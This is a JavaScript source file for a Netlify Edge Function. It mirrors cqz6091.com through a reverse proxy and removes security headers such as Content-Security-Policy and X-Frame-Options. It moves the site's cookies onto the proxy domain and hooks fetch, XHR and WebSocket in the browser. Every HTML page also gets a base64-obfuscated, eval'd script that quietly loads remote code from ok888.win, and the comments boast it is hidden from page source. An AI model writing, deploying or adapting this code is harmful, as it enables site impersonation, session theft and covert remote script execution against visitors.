/**
 * Netlify Edge Function — Reverse Proxy
 * Target : https://cqz6091.com/
 * Inject : https://ok888.win/proxy-assets/panel.js (hidden, obfuscated)
 *
 * Runtime: Deno (Netlify Edge)
 */

const TARGET_HOST   = 'cqz6091.com';
const TARGET_BASE   = 'https://' + TARGET_HOST;
const INJECT_SCRIPT = 'https://ok888.win/proxy-assets/panel.js';

const DROP_REQ = new Set([
  'host','connection','keep-alive','transfer-encoding','te','trailers',
  'upgrade','proxy-authorization','cf-ray','cf-connecting-ip','cf-ipcountry',
  'cf-visitor','cdn-loop','x-forwarded-proto','x-forwarded-for','accept-encoding',
  'x-nf-request-id','x-country','x-language',
]);

const DROP_RES = new Set([
  'transfer-encoding','content-encoding','content-length','connection',
  'keep-alive','alt-svc','x-frame-options',
  'content-security-policy','content-security-policy-report-only',
  'x-content-type-options',
]);

const HASH_RE = /[.\-][a-f0-9]{7,12}\.(js|css|woff2?|ttf|eot|otf)(\?.*)?$/i;
const TEXT_RE = /text\/|javascript|json|xml|css/;

export default async function proxy(request, context) {
  const url    = new URL(request.url);
  const myHost = url.hostname;
  const myBase = 'https://' + myHost;
  const method = request.method;

  // ── Build upstream URL ────────────────────────────────────────────────────
  const upUrl = new URL(url.pathname + url.search, TARGET_BASE);

  // ── Build upstream headers ────────────────────────────────────────────────
  const upH = new Headers();
  for (const [k, v] of request.headers) {
    if (DROP_REQ.has(k.toLowerCase())) continue;
    upH.set(k, v);
  }
  upH.set('Host', TARGET_HOST);
  upH.set('Accept-Encoding', 'gzip');
  upH.set('Referer', TARGET_BASE + url.pathname);
  upH.set('Origin', TARGET_BASE);

  // ── Fetch from upstream ───────────────────────────────────────────────────
  let upRes;
  try {
    upRes = await fetch(new Request(upUrl.toString(), {
      method,
      headers: upH,
      body: ['GET', 'HEAD'].includes(method) ? null : request.body,
      redirect: 'manual',
    }));
  } catch (e) {
    return new Response(`<h2>Proxy Error 502</h2><p>${e.message}</p>`, {
      status: 502,
      headers: { 'Content-Type': 'text/html' },
    });
  }

  // ── Redirects ─────────────────────────────────────────────────────────────
  if (upRes.status >= 300 && upRes.status < 400) {
    const loc = upRes.headers.get('location') || '';
    const h   = buildResHeaders(upRes.headers, TARGET_HOST, myHost, TARGET_BASE, myBase, url.pathname);
    h.set('Location', rw(loc, TARGET_HOST, myHost, TARGET_BASE, myBase));
    return new Response(null, { status: upRes.status, headers: h });
  }

  const ct   = upRes.headers.get('content-type') || '';
  const isT  = TEXT_RE.test(ct);
  const resH = buildResHeaders(upRes.headers, TARGET_HOST, myHost, TARGET_BASE, myBase, url.pathname);

  // ── Binary — stream directly ──────────────────────────────────────────────
  if (!isT) {
    return new Response(upRes.body, { status: upRes.status, headers: resH });
  }

  // ── Text — rewrite + inject ───────────────────────────────────────────────
  let body = await upRes.text();
  body = rw(body, TARGET_HOST, myHost, TARGET_BASE, myBase);

  if (ct.includes('css')) {
    body = body.replace(
      /url\(\s*(['"]?)([^)'"\s]*)(['"]?)\s*\)/gi,
      (_, q1, u, q2) => `url(${q1}${rw(u, TARGET_HOST, myHost, TARGET_BASE, myBase)}${q2})`
    );
  }

  if (ct.includes('text/html')) {
    body = injectHtml(body, TARGET_HOST, myHost, TARGET_BASE, myBase);
  }

  resH.set('Content-Type', ct);
  return new Response(body, { status: upRes.status, headers: resH });
}

// ── Config: catch ALL paths ───────────────────────────────────────────────────
export const config = { path: '/*' };

// ── Helpers ───────────────────────────────────────────────────────────────────

function rw(s, th, mh, tb, mb) {
  if (!s) return s;
  return s
    .replaceAll(tb,            mb)
    .replaceAll('https://' + th, mb)
    .replaceAll('http://'  + th, mb)
    .replaceAll('//'       + th, '//' + mh);
}

function buildResHeaders(src, th, mh, tb, mb, path) {
  const h = new Headers();
  for (const [k, v] of src) {
    const kl = k.toLowerCase();
    if (DROP_RES.has(kl)) continue;
    if (kl === 'set-cookie') {
      h.append(k,
        v.replace(/domain=[^;,\s]+/gi, 'domain=' + mh)
         .replace(/;\s*samesite=none/gi, '; SameSite=Lax')
      );
      continue;
    }
    if (kl === 'location')     { h.set(k, rw(v, th, mh, tb, mb)); continue; }
    if (kl === 'cache-control' && HASH_RE.test(path)) {
      h.set(k, 'public, max-age=2592000, immutable'); continue;
    }
    h.set(k, v);
  }
  return h;
}

function injectHtml(html, th, mh, tb, mb) {
  // Runtime code — minified, single-letter vars
  const code =
    `(function(){` +
    `var a=${JSON.stringify(th)},b=${JSON.stringify(mh)},c=${JSON.stringify(tb)},d=${JSON.stringify(mb)},p=${JSON.stringify(INJECT_SCRIPT)};` +
    `var r1=new RegExp("https?:\\\\/\\\\/"+a.replace(/\\./g,"\\\\."),"g"),r2=new RegExp("\\\\/\\\\/"+a.replace(/\\./g,"\\\\."),"g");` +
    `function f(u){if(!u||typeof u!="string")return u;return u.replace(r1,d).replace(r2,"//"+b)}` +
    `var _f=window.fetch;window.fetch=function(r,o){if(typeof r=="string")r=f(r);else if(r&&r.url)r=new Request(f(r.url),r);return _f.call(this,r,o)};` +
    `var _x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){arguments[1]=f(u);return _x.apply(this,arguments)};` +
    `if(window.WebSocket){var _w=window.WebSocket;window.WebSocket=function(u,q){return q?new _w(f(u),q):new _w(f(u))};window.WebSocket.prototype=_w.prototype;}` +
    `function n(e){if(!e||e.nodeType!==1)return;if(e.href&&e.href.includes(a))e.href=f(e.href);if(e.src&&e.src.includes(a))e.src=f(e.src);if(e.action&&e.action.includes(a))e.action=f(e.action)}` +
    `document.addEventListener("DOMContentLoaded",function(){` +
    `document.querySelectorAll("[href],[src],[action]").forEach(n);` +
    `new MutationObserver(function(ms){ms.forEach(function(m){m.addedNodes.forEach(function(nd){n(nd);if(nd.querySelectorAll)nd.querySelectorAll("[href],[src],[action]").forEach(n)})})}).observe(document.documentElement,{childList:true,subtree:true});` +
    `});` +
    `(function(){var s=document.createElement("script");s.src=p;s.async=true;document.head.appendChild(s)})();` +
    `})();`;

  // Base64 encode — nothing readable in page source
  const encoded = btoa(unescape(encodeURIComponent(code)));
  const tag = `<script>eval(decodeURIComponent(escape(atob("${encoded}"))))</script>`;

  if (html.includes('</body>'))  return html.replace('</body>', tag + '</body>');
  if (html.includes('</html>')) return html.replace('</html>', tag + '</html>');
  return html + tag;
}
